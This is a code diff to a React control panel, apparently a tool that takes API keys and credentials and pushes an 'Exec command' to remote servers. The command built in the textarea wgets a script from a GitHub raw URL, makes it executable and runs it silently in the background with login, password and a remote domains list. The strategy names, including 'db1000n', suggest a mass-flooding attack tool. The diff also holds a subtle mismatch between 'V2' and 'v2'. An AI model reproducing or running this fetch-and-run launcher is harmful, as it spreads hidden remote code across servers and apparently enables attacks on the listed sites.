@@ -41,7 +41,7 @@ function App() {
     password: ''
   })
   const [loadingState, setLoadingState] = useState({})
-  const [strategy, setStrategy] = useState('custom')
+  const [strategy, setStrategy] = useState('v2')
   const [domainsURL, setDomainsURL] = useState("https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/list.txt")
 
   const setLoading = (apiKey, loading) => {
@@ -410,15 +410,15 @@ function App() {
           <div className="col">
             <h4>Strategy</h4>
             <div className="form-check form-check-inline">
-              <input className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault1" onChange={() => setStrategy('custom')} checked={strategy === 'custom'} />
-              <label className="form-check-label" htmlFor="flexRadioDefault1">
-                Custom
+              <input className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault2" onChange={() => setStrategy('V2')} checked={strategy === 'v2'}/>
+              <label className="form-check-label" htmlFor="flexRadioDefault2">
+                V2
               </label>
             </div>
             <div className="form-check form-check-inline">
-              <input className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault2" onChange={() => setStrategy('db1000n')} disabled />
-              <label className="form-check-label" htmlFor="flexRadioDefault2">
-                DB1000N
+              <input className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault1" onChange={() => setStrategy('custom')} />
+              <label className="form-check-label" htmlFor="flexRadioDefault1">
+                Custom
               </label>
             </div>
           </div>
@@ -432,7 +432,7 @@ function App() {
         <div className="row">
           <div className="col">
             <label className="form-label">Exec command:</label>
-            <textarea ref={$exec} rows={"4"} cols={"75"} className="form-control mb-1" onChange={() => { }} value={'#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/' + (strategy === 'custom' ? 'custom' : 'db1000n') + '.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f ' + domainsURL + ' >/dev/null 2>&1 &'} />
+            <textarea ref={$exec} rows={"4"} cols={"75"} className="form-control mb-1" onChange={() => { }} value={'#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/' + (strategy === 'custom' ? 'custom' : 'dc') + '.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f ' + domainsURL + ' >/dev/null 2>&1 &'} />
           </div>
         </div>
         <button className="btn btn-primary mt-2" onClick={processApiKeys}>Process keys</button>
@@ -458,7 +458,6 @@ function App() {
                 <i className="bi bi-exclamation-triangle-fill me-1"></i>
                 Fill Everything
               </button>
-
             </div>
           </div>}
         </div>
